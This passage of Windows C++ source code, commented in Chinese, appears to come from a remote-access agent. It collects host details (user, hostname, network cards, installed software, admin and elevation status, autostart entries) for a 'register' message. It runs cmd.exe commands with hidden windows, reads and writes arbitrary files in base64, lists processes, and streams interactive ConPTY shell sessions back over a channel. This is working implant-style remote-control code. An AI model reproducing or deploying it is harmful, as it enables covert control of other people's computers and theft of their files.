    return acc;
}

#ifndef IF_TYPE_ETHERNET_CSMACD
#define IF_TYPE_ETHERNET_CSMACD 6
#endif
#ifndef IF_TYPE_IEEE80211
#define IF_TYPE_IEEE80211 71
#endif
#ifndef IF_TYPE_SOFTWARE_LOOPBACK
#define IF_TYPE_SOFTWARE_LOOPBACK 24
#endif

// 虚拟/VPN/抓包等适配器：名称命中则不作为「主内网 IP」候选。
static bool adapter_name_suggests_virtual(const std::string& nameLower) {
    static const char* subs[] = {"vmware",        "virtualbox", "hyper-v",    "hyperv",     "vethernet",
                                 "vmnet",         "npcap",      "tap-windows", "zerotier",  "tailscale",
                                 "wireguard",     "sing-box",   "singbox",     "openvpn",   "vpn",
                                 "nordlynx",      "meta vpn",   "loopback",    "pseudo",    "tunnel",
                                 "wintun",        "netease",    "cisco anyconnect", "wsl",    "bluetooth"};
    for (size_t i = 0; i < sizeof(subs) / sizeof(subs[0]); i++) {
        if (nameLower.find(subs[i]) != std::string::npos) return true;
    }
    return false;
}

static std::string first_ipv4_on_adapter(PIP_ADAPTER_ADDRESSES a) {
    for (PIP_ADAPTER_UNICAST_ADDRESS u = a->FirstUnicastAddress; u; u = u->Next) {
        if (u->Address.lpSockaddr->sa_family != AF_INET) continue;
        SOCKADDR_IN* sin = (SOCKADDR_IN*)u->Address.lpSockaddr;
        char ip[64];
        if (InetNtopA(AF_INET, &sin->sin_addr, ip, sizeof(ip)) && strcmp(ip, "127.0.0.1") != 0)
            return std::string(ip);
    }
    return "";
}

// 按类型优先级选内网 IP（跳过虚拟网卡）；在「出站路由」不可信时作回退。
static std::string pick_internal_ip_from_adapters(PIP_ADAPTER_ADDRESSES aa) {
    std::string ethIp, wlanIp, fallback;
    for (PIP_ADAPTER_ADDRESSES a = aa; a; a = a->Next) {
        if (a->OperStatus != IfOperStatusUp) continue;
        if (a->IfType == IF_TYPE_SOFTWARE_LOOPBACK) continue;
        std::string fn = a->FriendlyName ? wcs_to_utf8(a->FriendlyName) : "";
        std::string fl = ansi_lower(fn);
        if (adapter_name_suggests_virtual(fl)) continue;
        std::string ip = first_ipv4_on_adapter(a);
        if (ip.empty()) continue;
        ULONG ift = a->IfType;
        if (ift == IF_TYPE_ETHERNET_CSMACD && ethIp.empty())
            ethIp = ip;
        else if (ift == IF_TYPE_IEEE80211 && wlanIp.empty())
            wlanIp = ip;
        else if (fallback.empty())
            fallback = ip;
    }
    if (!ethIp.empty()) return ethIp;
    if (!wlanIp.empty()) return wlanIp;
    if (!fallback.empty()) return fallback;
    return "";
}

// 内网 IP：优先用「访问公网地址时系统选中的出口网卡」(GetBestInterface)，与当前默认路由一致；
// 若该网卡为虚拟适配器（如 VMnet 被设成默认路由），则回退为 以太网 > WLAN > 其它。
static std::string get_internal_ip() {
    ULONG sz = 0;
    GetAdaptersAddresses(AF_INET, GAA_FLAG_SKIP_ANYCAST, NULL, NULL, &sz);
    if (sz == 0) return "unknown";
    std::vector<BYTE> buf(sz);
    PIP_ADAPTER_ADDRESSES aa = (PIP_ADAPTER_ADDRESSES)buf.data();
    if (GetAdaptersAddresses(AF_INET, GAA_FLAG_SKIP_ANYCAST, NULL, aa, &sz) != NO_ERROR) return "unknown";

    struct in_addr probe = {0};
    if (InetPtonA(AF_INET, "223.5.5.5", &probe) == 1) {
        DWORD bestIf = 0;
        if (GetBestInterface(probe.S_un.S_addr, &bestIf) == NO_ERROR && bestIf != 0) {
            for (PIP_ADAPTER_ADDRESSES a = aa; a; a = a->Next) {
                if ((DWORD)a->IfIndex != bestIf) continue;
                if (a->OperStatus != IfOperStatusUp) break;
                std::string fn = a->FriendlyName ? wcs_to_utf8(a->FriendlyName) : "";
                std::string fl = ansi_lower(fn);
                if (!adapter_name_suggests_virtual(fl)) {
                    std::string ip = first_ipv4_on_adapter(a);
                    if (!ip.empty()) return ip;
                }
                break;
            }
        }
    }

    std::string fb = pick_internal_ip_from_adapters(aa);
    if (!fb.empty()) return fb;
    return "unknown";
}

static std::string collect_network_summary() {
    ULONG sz = 0;
    ULONG fam = AF_INET;
    ULONG flags = GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_DNS_SERVER;
    GetAdaptersAddresses(fam, flags, NULL, NULL, &sz);
    if (sz == 0) return get_internal_ip();
    std::vector<BYTE> buf(sz);
    PIP_ADAPTER_ADDRESSES aa = (PIP_ADAPTER_ADDRESSES)buf.data();
    if (GetAdaptersAddresses(fam, flags, NULL, aa, &sz) != NO_ERROR) return get_internal_ip();
    std::string out;
    for (PIP_ADAPTER_ADDRESSES a = aa; a; a = a->Next) {
        if (a->OperStatus != IfOperStatusUp) continue;
        const WCHAR* fn = a->FriendlyName;
        std::string name = fn ? wcs_to_utf8(fn) : "adapter";
        std::string ip4;
        for (PIP_ADAPTER_UNICAST_ADDRESS u = a->FirstUnicastAddress; u; u = u->Next) {
            if (u->Address.lpSockaddr->sa_family != AF_INET) continue;
            SOCKADDR_IN* sin = (SOCKADDR_IN*)u->Address.lpSockaddr;
            char ip[64];
            if (InetNtopA(AF_INET, &sin->sin_addr, ip, sizeof(ip))) {
                ip4 = ip;
                break;
            }
        }
        if (ip4.empty()) continue;
        if (!out.empty()) out += " | ";
        out += name + ": " + ip4;
        if (out.size() > 1000) break;
    }
    if (out.empty()) return get_internal_ip();
    return out;
}

static bool run_key_contains_exe(HKEY root, const char* subkey, const std::string& exeLower) {
    HKEY hKey = NULL;
    if (RegOpenKeyExA(root, subkey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) return false;
    char name[256], data[8192];
    for (DWORD i = 0;; i++) {
        DWORD nl = sizeof(name), dl = sizeof(data), typ = 0;
        LONG r = RegEnumValueA(hKey, i, name, &nl, NULL, &typ, (LPBYTE)data, &dl);
        if (r != ERROR_SUCCESS) break;
        if (typ != REG_SZ && typ != REG_EXPAND_SZ) continue;
        if (dl <= 1) continue;
        std::string v(data, dl - 1);
        std::string vl = ansi_lower(v);
        if (vl.find(exeLower) != std::string::npos) {
            RegCloseKey(hKey);
            return true;
        }
    }
    RegCloseKey(hKey);
    return false;
}

static void detect_autostart(const char* exePath, std::string& autoStart, std::string& autoType) {
    std::string exel = ansi_lower(std::string(exePath));
    const char* base = strrchr(exePath, '\\');
    std::string basel = ansi_lower(base ? (base + 1) : exePath);
    if (run_key_contains_exe(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", exel) ||
        run_key_contains_exe(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", basel)) {
        autoStart = "true";
        autoType = "HKCU Run";
        return;
    }
    if (run_key_contains_exe(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", exel) ||
        run_key_contains_exe(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", basel)) {
        autoStart = "true";
        autoType = "HKLM Run";
        return;
    }
    autoStart = "false";
    autoType = "";
}

static std::string collect_installed_apps_summary() {
    std::string acc;
    auto scan_root = [&](HKEY root, const char* path) {
        HKEY hKey = NULL;
        if (RegOpenKeyExA(root, path, 0, KEY_READ | KEY_WOW64_64KEY, &hKey) != ERROR_SUCCESS) return;
        char sub[256];
        int napp = 0;
        for (DWORD i = 0; napp < 55; i++) {
            DWORD sl = sizeof(sub);
            if (RegEnumKeyExA(hKey, i, sub, &sl, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
            std::string sk = std::string(path) + "\\" + sub;
            HKEY subk = NULL;
            if (RegOpenKeyExA(root, sk.c_str(), 0, KEY_READ | KEY_WOW64_64KEY, &subk) != ERROR_SUCCESS) continue;
            char dn[512];
            DWORD dnl = sizeof(dn), typ = 0;
            if (RegQueryValueExA(subk, "DisplayName", NULL, &typ, (LPBYTE)dn, &dnl) != ERROR_SUCCESS || (typ != REG_SZ && typ != REG_EXPAND_SZ)) {
                RegCloseKey(subk);
                continue;
            }
            DWORD sys = 0, slen = sizeof(sys);
            if (RegQueryValueExA(subk, "SystemComponent", NULL, NULL, (LPBYTE)&sys, &slen) == ERROR_SUCCESS && sys == 1) {
                RegCloseKey(subk);
                continue;
            }
            RegCloseKey(subk);
            std::string dname(dn, dnl > 1 ? dnl - 1 : 0);
            if (dname.empty()) continue;
            if (!acc.empty()) acc += "; ";
            acc += dname;
            napp++;
            if (acc.size() > 7500) break;
        }
        RegCloseKey(hKey);
    };
    scan_root(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
    scan_root(HKEY_LOCAL_MACHINE, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
    return acc;
}

static bool token_in_admin_group() {
    HANDLE hTok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) return false;
    SID_IDENTIFIER_AUTHORITY NtAuth = SECURITY_NT_AUTHORITY;
    PSID pAdmin = NULL;
    BOOL ok = AllocateAndInitializeSid(&NtAuth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdmin);
    BOOL isM = FALSE;
    if (ok && pAdmin) CheckTokenMembership(hTok, pAdmin, &isM);
    if (pAdmin) FreeSid(pAdmin);
    CloseHandle(hTok);
    return isM != FALSE;
}

static bool token_elevated() {
    HANDLE hTok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) return false;
    TOKEN_ELEVATION el;
    DWORD rs = 0;
    BOOL ok = GetTokenInformation(hTok, TokenElevation, &el, sizeof(el), &rs);
    CloseHandle(hTok);
    return ok && el.TokenIsElevated;
}

static std::string token_integrity_label() {
    HANDLE hTok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) return "Unknown";
    DWORD len = 0;
    GetTokenInformation(hTok, TokenIntegrityLevel, NULL, 0, &len);
    if (len == 0) {
        CloseHandle(hTok);
        return "Unknown";
    }
    std::vector<BYTE> buf(len);
    TOKEN_MANDATORY_LABEL* til = (TOKEN_MANDATORY_LABEL*)buf.data();
    if (!GetTokenInformation(hTok, TokenIntegrityLevel, til, len, &len)) {
        CloseHandle(hTok);
        return "Unknown";
    }
    DWORD rid = *GetSidSubAuthority(til->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(til->Label.Sid) - 1));
    CloseHandle(hTok);
    if (rid >= SECURITY_MANDATORY_SYSTEM_RID) return "System";
    if (rid >= SECURITY_MANDATORY_HIGH_RID) return "High";
    if (rid >= SECURITY_MANDATORY_MEDIUM_RID) return "Medium";
    if (rid >= SECURITY_MANDATORY_LOW_RID) return "Low";
    return "Medium";
}

static void collect_register(std::map<std::string, std::string>& reg) {
    reg["type"] = "register";
    reg["external_ip"] = "";
    reg["external_location"] = "";
    reg["internal_ip"] = get_internal_ip();
    WCHAR wun[256] = {0};
    DWORD wul = sizeof(wun) / sizeof(wun[0]);
    if (GetUserNameW(wun, &wul))
        reg["username"] = wcs_to_utf8(wun);
    else {
        char un[256] = {0};
        DWORD ulen = sizeof(un);
        if (GetUserNameA(un, &ulen)) reg["username"] = un;
        else reg["username"] = "unknown";
    }
    reg["hostname"] = get_hostname_utf8();
    std::string arch = arch_key_from_si();
    reg["os_type"] = std::string("windows_") + arch;
    reg["os_version"] = get_os_version_display();
    reg["architecture"] = arch;
    char exep[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, exep, MAX_PATH);
    const char* bn = strrchr(exep, '\\');
    reg["process_name"] = bn ? (bn + 1) : exep;
    reg["process_id"] = std::to_string((int)GetCurrentProcessId());
    reg["vkey"] = VKEY;
    reg["is_admin"] = token_in_admin_group() ? "true" : "false";
    reg["is_elevated"] = token_elevated() ? "true" : "false";
    reg["integrity"] = token_integrity_label();
    MEMORYSTATUSEX ms = {sizeof(ms)};
    GlobalMemoryStatusEx(&ms);
    reg["memory_size"] = std::to_string((int)(ms.ullTotalPhys / (1024 * 1024)));
    reg["cpu_info"] = get_cpu_model();
    ULARGE_INTEGER free, total;
    if (GetDiskFreeSpaceExA("C:\\", &free, &total, NULL))
        reg["disk_size"] = std::to_string((long long)(total.QuadPart / (1024LL * 1024LL * 1024LL)));
    else
        reg["disk_size"] = "0";
    reg["screen_resolution"] = get_primary_resolution();
    std::string gpu = collect_gpu_driver_desc();
    if (!gpu.empty()) reg["gpu_info"] = gpu;
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    reg["logical_processors"] = std::to_string((int)si.dwNumberOfProcessors);
    char cwd[MAX_PATH] = {0};
    if (GetCurrentDirectoryA(sizeof(cwd), cwd)) reg["working_dir"] = cwd;
    reg["network_card"] = collect_network_summary();
    reg["installed_apps"] = collect_installed_apps_summary();
    std::string as, at;
    detect_autostart(exep, as, at);
    reg["auto_start"] = as;
    reg["auto_start_type"] = at;
}

// ---------- 命令执行 ----------
static std::string sh_exec(const std::string& cmd) {
    HANDLE rOut, wOut;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    if (!CreatePipe(&rOut, &wOut, &sa, 0)) return "pipe failed";
    SetHandleInformation(rOut, HANDLE_FLAG_INHERIT, 0);
    STARTUPINFOA si = {sizeof(si)};
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = wOut;
    si.hStdError = wOut;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    PROCESS_INFORMATION pi = {0};
    std::string line = "cmd.exe /c " + cmd;
    char* cmdline = _strdup(line.c_str());
    BOOL ok = CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    free(cmdline);
    CloseHandle(wOut);
    if (!ok) {
        CloseHandle(rOut);
        return "CreateProcess failed";
    }
    std::string out;
    char buf[4096];
    DWORD br;
    while (ReadFile(rOut, buf, sizeof(buf) - 1, &br, NULL) && br > 0) {
        buf[br] = 0;
        out += buf;
    }
    WaitForSingleObject(pi.hProcess, 60000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(rOut);
    return out;
}

static std::string utf8_to_ansi(const std::string& u8) {
    if (u8.empty()) return u8;
    int wlen = MultiByteToWideChar(CP_UTF8, 0, u8.c_str(), -1, NULL, 0);
    if (wlen <= 0) return u8;
    std::wstring w((size_t)wlen, 0);
    MultiByteToWideChar(CP_UTF8, 0, u8.c_str(), -1, &w[0], wlen);
    int alen = WideCharToMultiByte(CP_ACP, 0, w.c_str(), -1, NULL, 0, NULL, NULL);
    if (alen <= 0) return u8;
    std::string a((size_t)alen - 1, 0);
    WideCharToMultiByte(CP_ACP, 0, w.c_str(), -1, &a[0], alen, NULL, NULL);
    return a;
}

static std::wstring to_wide(const std::string& ansi) {
    int n = MultiByteToWideChar(CP_ACP, 0, ansi.c_str(), -1, NULL, 0);
    std::wstring w((size_t)n, 0);
    MultiByteToWideChar(CP_ACP, 0, ansi.c_str(), -1, &w[0], n);
    if (!w.empty() && w.back() == 0) w.pop_back();
    return w;
}

static std::string list_dir_json(const std::string& dir) {
    std::string d = dir.empty() ? "." : dir;
    std::wstring wdir = to_wide(utf8_to_ansi(d));
    if (wdir.empty()) wdir = L".";
    std::wstring pat = wdir;
    if (!pat.empty() && pat.back() != L'\\') pat += L"\\";
    pat += L"*";
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(pat.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return "[]";
    std::string r = "[";
    bool first = true;
    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        std::wstring fullw = wdir;
        if (!fullw.empty() && fullw.back() != L'\\') fullw += L'\\';
        fullw += fd.cFileName;
        char fulla[MAX_PATH * 2];
        WideCharToMultiByte(CP_UTF8, 0, fullw.c_str(), -1, fulla, sizeof(fulla), NULL, NULL);
        char nameu8[MAX_PATH * 2];
        WideCharToMultiByte(CP_UTF8, 0, fd.cFileName, -1, nameu8, sizeof(nameu8), NULL, NULL);
        FILETIME ft = fd.ftLastWriteTime;
        SYSTEMTIME st;
        FileTimeToSystemTime(&ft, &st);
        char mt[64];
        snprintf(mt, sizeof(mt), "%04d-%02d-%02d %02d:%02d:%02d", (int)st.wYear, (int)st.wMonth, (int)st.wDay, (int)st.wHour, (int)st.wMinute, (int)st.wSecond);
        bool isd = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
        ULARGE_INTEGER sz;
        sz.LowPart = fd.nFileSizeLow;
        sz.HighPart = fd.nFileSizeHigh;
        if (!first) r += ",";
        first = false;
        std::string jn, jf, jm;
        json_esc(nameu8, jn);
        json_esc(fulla, jf);
        json_esc(mt, jm);
        r += "{\"name\":\"" + jn + "\",\"path\":\"" + jf + "\",\"is_dir\":" + std::string(isd ? "true" : "false") +
             ",\"size\":" + std::to_string(sz.QuadPart) + ",\"modified\":\"" + jm + "\"}";
    } while (FindNextFileW(h, &fd));
    FindClose(h);
    r += "]";
    return r;
}

static std::string list_dir_children_json(const std::string& rawPath) {
    std::string p = rawPath.empty() ? "." : rawPath;
    if (p == "/" || p == ".") {
        DWORD drives = GetLogicalDrives();
        std::string r = "[";
        bool first = true;
        for (int i = 0; i < 26; i++) {
            if (!(drives & (1 << i))) continue;
            char root[4] = {char('A' + i), ':', '\\', 0};
            UINT dt = GetDriveTypeA(root);
            if (dt == DRIVE_UNKNOWN || dt == DRIVE_NO_ROOT_DIR) continue;
            if (!first) r += ",";
            first = false;
            std::string jn, jf;
            json_esc(std::string(1, char('A' + i)) + ":\\", jn);
            json_esc(std::string(1, char('A' + i)) + ":\\", jf);
            r += "{\"name\":\"" + jn + "\",\"path\":\"" + jf + "\",\"type\":\"directory\"}";
        }
        r += "]";
        return r;
    }
    return list_dir_json(p);
}

static std::string read_file_b64(const std::string& path) {
    std::string ap = utf8_to_ansi(path);
    HANDLE h = CreateFileA(ap.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return "";
    std::string out;
    BYTE buf[65536];
    DWORD br;
    while (ReadFile(h, buf, sizeof(buf), &br, NULL) && br > 0) out.append((char*)buf, br);
    CloseHandle(h);
    return b64_enc((const unsigned char*)out.data(), out.size());
}

// Returns false only on I/O failure; out_b64 may be empty when the read length is 0 (EOF / empty file).
static bool read_file_range_b64(const std::string& path, uint64_t off, size_t maxRead, std::string& out_b64) {
    std::string ap = utf8_to_ansi(path);
    HANDLE h = CreateFileA(ap.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;
    LARGE_INTEGER li;
    li.QuadPart = (LONGLONG)off;
    if (!SetFilePointerEx(h, li, NULL, FILE_BEGIN)) {
        CloseHandle(h);
        return false;
    }
    std::vector<BYTE> buf(maxRead);
    DWORD br = 0;
    if (!ReadFile(h, buf.data(), (DWORD)maxRead, &br, NULL)) {
        CloseHandle(h);
        return false;
    }
    CloseHandle(h);
    out_b64 = b64_enc(buf.data(), br);
    return true;
}

static bool write_file_full(const std::string& path, const std::string& b64) {
    std::vector<BYTE> raw = b64_dec(b64);
    std::string ap = utf8_to_ansi(path);
    HANDLE h = CreateFileA(ap.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;
    DWORD bw;
    BOOL ok = WriteFile(h, raw.data(), (DWORD)raw.size(), &bw, NULL);
    CloseHandle(h);
    return ok && bw == raw.size();
}

static bool write_file_chunk(const std::string& path, const std::string& b64, uint64_t chunkIndex) {
    std::vector<BYTE> raw = b64_dec(b64);
    std::string ap = utf8_to_ansi(path);
    DWORD disp = (chunkIndex == 0) ? CREATE_ALWAYS : OPEN_EXISTING;
    HANDLE h = CreateFileA(ap.c_str(), GENERIC_WRITE, 0, NULL, disp, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;
    if (chunkIndex > 0) {
        LARGE_INTEGER li;
        li.QuadPart = (LONGLONG)(chunkIndex * kFileChunkSize);
        SetFilePointerEx(h, li, NULL, FILE_BEGIN);
    }
    DWORD bw;
    BOOL ok = WriteFile(h, raw.data(), (DWORD)raw.size(), &bw, NULL);
    CloseHandle(h);
    return ok && bw == raw.size();
}

static std::string process_list_json() {
    std::string r = "[";
    bool first = true;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return "[]";
    PROCESSENTRY32W pe = {sizeof(pe)};
    if (Process32FirstW(snap, &pe)) {
        do {
            if (!first) r += ",";
            first = false;
            char name[512];
            WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, name, sizeof(name), NULL, NULL);
            std::string jn;
            json_esc(name, jn);
            r += "{\"pid\":" + std::to_string((int)pe.th32ProcessID) + ",\"name\":\"" + jn + "\"}";
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    r += "]";
    return r;
}

// ---------- Shell 会话：优先 ConPTY（伪终端），退格/行编辑与真实 cmd 一致；匿名管道无行编辑，\x08 会被当普通字符。----------
struct ShellSession {
    HANDLE hProc = NULL;
    HANDLE hWrite = NULL;
    HANDLE hRead = NULL;
    void* hPC = NULL; // HPCON，ConPTY 时非空
    bool useConPty = false;
    std::thread th;
    std::atomic<bool> run{false};
    std::string sid;
};

static std::map<std::string, ShellSession*> g_shells;
static std::mutex g_shell_mu;

// cmd 管道输出为当前控制台代码页（简中系统多为 GBK）；JSON 与浏览器须 UTF-8。
static std::string console_output_to_utf8(const char* src, size_t len) {
    if (!len) return "";
    UINT cp = GetConsoleOutputCP();
    if (cp == 0) cp = GetACP();
    if (cp == 0) cp = CP_OEMCP;
    int wlen = MultiByteToWideChar(cp, 0, src, (int)len, NULL, 0);
    if (wlen <= 0) return std::string(src, len);
    std::wstring w((size_t)wlen, L'\0');
    if (!MultiByteToWideChar(cp, 0, src, (int)len, &w[0], wlen)) return std::string(src, len);
    int u8len = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), wlen, NULL, 0, NULL, NULL);
    if (u8len <= 0) return std::string(src, len);
    std::string out((size_t)u8len, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), wlen, &out[0], u8len, NULL, NULL);
    return out;
}

// 将单个 UTF-8 字符（非 ASCII 控制段）转为控制台输入代码页字节。
static std::string utf8_one_char_to_oem(const std::string& one_utf8) {
    if (one_utf8.empty()) return one_utf8;
    int wlen = MultiByteToWideChar(CP_UTF8, 0, one_utf8.data(), (int)one_utf8.size(), NULL, 0);
    if (wlen <= 0) return one_utf8;
    std::wstring w((size_t)wlen, L'\0');
    if (!MultiByteToWideChar(CP_UTF8, 0, one_utf8.data(), (int)one_utf8.size(), &w[0], wlen)) return one_utf8;
    UINT cp = GetConsoleCP();
    if (cp == 0) cp = GetACP();
    if (cp == 0) cp = CP_OEMCP;
    int blen = WideCharToMultiByte(cp, 0, w.c_str(), wlen, NULL, 0, NULL, NULL);
    if (blen <= 0) return one_utf8;
    std::string out((size_t)blen, '\0');
    WideCharToMultiByte(cp, 0, w.c_str(), wlen, &out[0], blen, NULL, NULL);
    return out;
}

// 浏览器下发 UTF-8，cmd 管道侧按控制台输入代码页写入（与 chcp 一致，简中多为 GBK）。
// 控制符（含退格 0x08）必须直通，整段 UTF-8→OEM 时 WideCharToMultiByte 对 U+0008 等可能变成空格或其它字节，导致「dir    calc」粘连。
static std::string utf8_to_console_input_bytes(const std::string& utf8) {
    if (utf8.empty()) return utf8;
    std::string out;
    out.reserve(utf8.size());
    size_t i = 0;
    while (i < utf8.size()) {
        unsigned char c0 = (unsigned char)utf8[i];
        if (c0 < 0x80u) {
            if (c0 <= 0x1Fu) {
                out += (char)c0;
            } else if (c0 == 0x7fu) {
                out += '\x08';
            } else {
                out += (char)c0;
            }
            i++;
            continue;
        }
        size_t run = 1;
        if ((c0 & 0xE0u) == 0xC0u) run = 2;
        else if ((c0 & 0xF0u) == 0xE0u) run = 3;
        else if ((c0 & 0xF8u) == 0xF0u) run = 4;
        else {
            out += (char)c0;
            i++;
            continue;
        }
        if (i + run > utf8.size()) {
            out += (char)c0;
            i++;
            continue;
        }
        std::string chunk = utf8.substr(i, run);
        out += utf8_one_char_to_oem(chunk);
        i += run;
    }
    return out;
}

// ConPTY 输入侧走 UTF-8（与 conhost 行编辑一致）；不做 OEM 转码，仅映射 DEL→BS。
static std::string utf8_to_conpty_input_bytes(const std::string& utf8) {
    std::string out;
    out.reserve(utf8.size());
    size_t i = 0;
    while (i < utf8.size()) {
        unsigned char c0 = (unsigned char)utf8[i];
        if (c0 == 0x7fu) {
            out += '\x08';
            i++;
            continue;
        }
        if (c0 < 0x80u) {
            out += (char)c0;
            i++;
            continue;
        }
        size_t run = 1;
        if ((c0 & 0xE0u) == 0xC0u) run = 2;
        else if ((c0 & 0xF0u) == 0xE0u) run = 3;
        else if ((c0 & 0xF8u) == 0xF0u) run = 4;
        else {
            out += (char)c0;
            i++;
            continue;
        }
        if (i + run > utf8.size()) {
            out += (char)c0;
            i++;
            continue;
        }
        out.append(utf8, i, run);
        i += run;
    }
    return out;
}

static void shell_read_thread(ShellSession* s) {
    char buf[8192];
    DWORD br;
    agent_dbg("[shell-read] start sid=%s", s->sid.c_str());
    while (s->run && s->hRead) {
        br = 0;
        BOOL rfOk = ReadFile(s->hRead, buf, sizeof(buf) - 1, &br, NULL);
        if (!rfOk || br == 0) {
            DWORD le = GetLastError();
            agent_dbg("[shell-read] exit sid=%s ReadFile=%d br=%lu le=%lu", s->sid.c_str(), rfOk ? 1 : 0, (unsigned long)br,
                      (unsigned long)le);
            break;
        }
        agent_dbg("[shell-read] sid=%s out_bytes=%lu ws=%d conpty=%d", s->sid.c_str(), (unsigned long)br, g_use_ws.load() ? 1 : 0,
                  s->useConPty ? 1 : 0);
        agent_dbg_bytes("[shell-read] out_snip", std::string(buf, br), 120);
        std::string dataOut;
        if (s->useConPty) {
            // 伪终端输出已是 UTF-8，勿再按 GBK/OEM 转，否则中文乱码。
            dataOut.assign(buf, br);
        } else {
            dataOut = console_output_to_utf8(buf, br);
        }
        std::string line;
        line.reserve(64 + dataOut.size() + dataOut.size() / 8);
        line += "{\"type\":\"shell_output\",\"session_id\":\"";
        json_esc(s->sid, line);
        line += "\",\"data\":\"";
        json_esc_shell_data(dataOut, line);
        line += "\"}";
        channel_send(line);
    }
    agent_dbg("[shell-read] thread end sid=%s", s->sid.c_str());
}

// Win10 1809+：CreatePseudoConsole + 子进程挂到伪终端，退格/回车由 conhost 行编辑处理。
static bool shell_try_create_conpty(ShellSession* ss, const std::string& sid) {
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    if (!k32) return false;
    typedef HRESULT(WINAPI * PFN_CreatePseudoConsole)(COORD, HANDLE, HANDLE, DWORD, void**);
    typedef void(WINAPI * PFN_ClosePseudoConsole)(void*);
    typedef BOOL(WINAPI * PFN_InitializeProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
    typedef BOOL(WINAPI * PFN_UpdateProcThreadAttribute)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID,
                                                         PSIZE_T);
    typedef void(WINAPI * PFN_DeleteProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST);

    auto pCreatePC = (PFN_CreatePseudoConsole)GetProcAddress(k32, "CreatePseudoConsole");
    auto pClosePC = (PFN_ClosePseudoConsole)GetProcAddress(k32, "ClosePseudoConsole");
    auto pInit = (PFN_InitializeProcThreadAttributeList)GetProcAddress(k32, "InitializeProcThreadAttributeList");
    auto pUpd = (PFN_UpdateProcThreadAttribute)GetProcAddress(k32, "UpdateProcThreadAttribute");
    auto pDel = (PFN_DeleteProcThreadAttributeList)GetProcAddress(k32, "DeleteProcThreadAttributeList");
    if (!pCreatePC || !pClosePC || !pInit || !pUpd || !pDel) return false;

    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE inRead = NULL, inWrite = NULL, outRead = NULL, outWrite = NULL;
    if (!CreatePipe(&inRead, &inWrite, &sa, 0) || !CreatePipe(&outRead, &outWrite, &sa, 0)) return false;

    COORD psz = {120, 30};
    void* hPC = NULL;
    HRESULT hr = pCreatePC(psz, inRead, outWrite, 0, &hPC);
    if (FAILED(hr)) {
        CloseHandle(inRead);
        CloseHandle(inWrite);
        CloseHandle(outRead);
        CloseHandle(outWrite);
        agent_dbg("[shell-create] CreatePseudoConsole hr=0x%lx", (unsigned long)(unsigned)hr);
        return false;
    }
    // 勿在 CreateProcess 之前关闭 inRead/outWrite：二者已交给 CreatePseudoConsole，过早关闭会导致子进程未挂接 PTY、
    // 桌面弹出独立 cmd 窗口，且 Web 端读不到输出。见 MS「Creating a Pseudoconsole session」：在 CreateProcess 成功后再释放这两端。

    SIZE_T attrSize = 0;
    pInit(NULL, 1, 0, &attrSize);
    if (attrSize == 0) {
        pClosePC(hPC);
        CloseHandle(inRead);
        CloseHandle(outWrite);
        CloseHandle(inWrite);
        CloseHandle(outRead);
        return false;
    }
    uint8_t* attrBuf = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
    if (!attrBuf) {
        pClosePC(hPC);
        CloseHandle(inRead);
        CloseHandle(outWrite);
        CloseHandle(inWrite);
        CloseHandle(outRead);
        return false;
    }
